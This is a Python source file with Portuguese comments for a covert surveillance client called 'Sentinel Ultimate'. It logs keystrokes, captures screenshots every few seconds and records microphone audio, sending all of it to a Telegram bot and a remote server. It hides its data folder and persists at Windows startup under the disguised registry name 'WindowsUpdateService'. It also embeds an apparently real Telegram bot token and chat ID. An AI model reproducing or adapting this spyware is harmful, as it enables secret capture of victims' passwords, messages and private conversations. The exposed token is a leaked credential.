#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
SENTINEL ULTIMATE - CLIENTE LOCAL
Roda no PC monitorado e envia dados para o servidor online
"""

import os
import sys
import threading
import time
import requests
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
from datetime import datetime
import numpy as np
import json
import ctypes
import winreg

# ============================================
# CONFIGURAÇÕES
# ============================================

# URL do seu servidor online no Render
SERVIDOR_URL = 'https://sentinel-monitor.onrender.com'  # Substitua pelo seu URL

# Telegram (envio direto também)
BOT_TOKEN = '8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0'
CHAT_ID = '5672315001'

# Pastas locais
DATA_DIR = "SystemData"
LOG_DIR = os.path.join(DATA_DIR, "Logs")
SCREENSHOT_DIR = os.path.join(DATA_DIR, "Cache")
AUDIO_DIR = os.path.join(DATA_DIR, "Temp")
KEYLOG_PATH = os.path.join(LOG_DIR, "syslog.txt")

for pasta in [DATA_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
    os.makedirs(pasta, exist_ok=True)

# Ocultar pasta
try:
    ctypes.windll.kernel32.SetFileAttributesW(DATA_DIR, 2)
except:
    pass

# Variáveis
monitor_ativo = True
tempo_screenshot = 5
tempo_audio = 10
ultima_screenshot = None
ultimo_audio = None
ultimas_frases = []
buffer_teclas = ""
ultimo_tempo = time.time()

estatisticas = {
    'screenshots': 0,
    'audios': 0,
    'teclas': 0,
    'palavras': 0,
    'start_time': time.time()
}

# ============================================
# PERSISTÊNCIA (INICIAR COM WINDOWS)
# ============================================

def adicionar_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
        return True
    except:
        return False

adicionar_startup()

# ============================================
# ENVIO PARA SERVIDOR E TELEGRAM
# ============================================

def enviar_para_servidor(tipo, dados):
    """Envia dados para o servidor online"""
    try:
        url = f"{SERVIDOR_URL}/upload_data"
        payload = {}
        
        if tipo == 'screenshot':
            # Enviar screenshot como base64
            import base64
            with open(dados, 'rb') as f:
                payload['screenshot'] = base64.b64encode(f.read()).decode()
        elif tipo == 'audio':
            import base64
            with open(dados, 'rb') as f:
                payload['audio'] = base64.b64encode(f.read()).decode()
        elif tipo == 'teclas':
            payload['teclas'] = dados
        
        if payload:
            response = requests.post(url, json=payload, timeout=10)
            return response.status_code == 200
    except Exception as e:
        print(f"Erro ao enviar para servidor: {e}")
        return False

def enviar_telegram_mensagem(texto):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
    except:
        pass

def enviar_telegram_arquivo(caminho, legenda):
    try:
        with open(caminho, "rb") as f:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            requests.post(url, data={"chat_id": CHAT_ID, "caption": legenda}, files={"document": f}, timeout=10)
    except:
        pass

# ============================================
# KEYLOGGER
# ============================================

def processar_tecla(tecla):
    global buffer_teclas, ultimas_frases, estatisticas, ultimo_tempo, monitor_ativo
    if not monitor_ativo:
        return
    
    try:
        if hasattr(tecla, 'char') and tecla.char:
            caractere = tecla.char
            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?']:
                buffer_teclas += caractere
                ultimo_tempo = time.time()
            elif caractere == '\r' or caractere == '\n':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
        else:
            tecla_nome = str(tecla).replace('Key.', '')
            if tecla_nome == 'space':
                buffer_teclas += ' '
                ultimo_tempo = time.time()
            elif tecla_nome == 'enter':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
        
        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
            registrar_frase(buffer_teclas.strip())
            buffer_teclas = ""
    except:
        pass

def registrar_frase(frase):
    global ultimas_frases, estatisticas
    if not frase.strip():
        return
    
    timestamp = datetime.now().strftime("%H:%M:%S")
    registro = f"[{timestamp}] {frase}"
    
    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
        f.write(registro + "\n")
    
    ultimas_frases.append(registro)
    if len(ultimas_frases) > 100:
        ultimas_frases.pop(0)
    
    estatisticas['teclas'] += len(frase)
    estatisticas['palavras'] += 1
    
    # Enviar para Telegram
    enviar_telegram_mensagem(f"⌨️ {frase}")
    
    # Enviar para servidor
    enviar_para_servidor('teclas', [registro])

def iniciar_keylogger():
    with keyboard.Listener(on_press=processar_tecla) as listener:
        listener.join()

# ============================================
# CAPTURAS
# ============================================

def capturar_screenshot():
    global ultima_screenshot, estatisticas, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"scr_{int(time.time())}.png"
        caminho = os.path.join(SCREENSHOT_DIR, nome)
        pyautogui.screenshot(caminho)
        ultima_screenshot = caminho
        estatisticas['screenshots'] += 1
        
        # Enviar para Telegram
        enviar_telegram_arquivo(caminho, "📸 Screenshot")
        
        # Enviar para servidor online
        enviar_para_servidor('screenshot', caminho)
        
        return caminho
    except Exception as e:
        print(f"Erro screenshot: {e}")
        return None

def capturar_audio():
    global ultimo_audio, estatisticas, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"aud_{int(time.time())}.wav"
        caminho = os.path.join(AUDIO_DIR, nome)
        
        fs = 44100
        duracao = 5
        
        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()
        gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
        sf.write(caminho, gravacao, fs)
        
        ultimo_audio = caminho
        estatisticas['audios'] += 1
        
        # Enviar para Telegram
        enviar_telegram_arquivo(caminho, "🎤 Áudio")
        
        # Enviar para servidor online
        enviar_para_servidor('audio', caminho)
        
        return caminho
    except Exception as e:
        print(f"Erro áudio: {e}")
        return None

def loop_captura():
    global monitor_ativo, tempo_screenshot
    while True:
        if monitor_ativo:
            capturar_screenshot()
        time.sleep(tempo_screenshot)

def loop_audio():
    global monitor_ativo, tempo_audio
    while True:
        if monitor_ativo:
            capturar_audio()
        time.sleep(tempo_audio)

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("🛡️ SENTINEL ULTIMATE - CLIENTE LOCAL")
    print("=" * 60)
    print("✅ Monitoramento ATIVADO")
    print(f"📸 Screenshot: a cada {tempo_screenshot} segundos")
    print(f"🎤 Áudio: a cada {tempo_audio} segundos")
    print(f"⌨️ Keylogger: em tempo real")
    print(f"📡 Enviando dados para: {SERVIDOR_URL}")
    print("=" * 60)
    print("")
    print("🛑 Pressione CTRL+C para parar")
    print("=" * 60)
    
    # Enviar mensagem de início
    enviar_telegram_mensagem("🛡️ SENTINEL CLIENTE LOCAL INICIADO!")
    
    # Iniciar threads
    threading.Thread(target=iniciar_keylogger, daemon=True).start()
    threading.Thread(target=loop_captura, daemon=True).start()
    threading.Thread(target=loop_audio, daemon=True).start()
    
    try:
        # Manter o programa rodando
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Encerrando...")